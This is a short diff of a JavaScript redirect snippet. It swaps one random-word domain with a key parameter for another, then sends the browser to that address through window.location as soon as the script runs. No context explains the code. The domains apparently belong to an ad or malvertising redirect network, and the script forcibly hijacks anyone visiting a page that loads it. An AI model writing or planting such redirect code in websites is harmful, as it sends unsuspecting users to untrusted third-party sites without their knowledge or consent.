@@ -1,6 +1,6 @@
 var dataUrl = [
 
-  'https://tripsthorpelemonade.com/n3rygrvt?key=a754d241514b7a41541b5461ce5e5e4e'
+  'https://engagedpungentrepress.com/i8qigyrv?key=489a4f2de7d0a6399f00397a1ce9becb'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
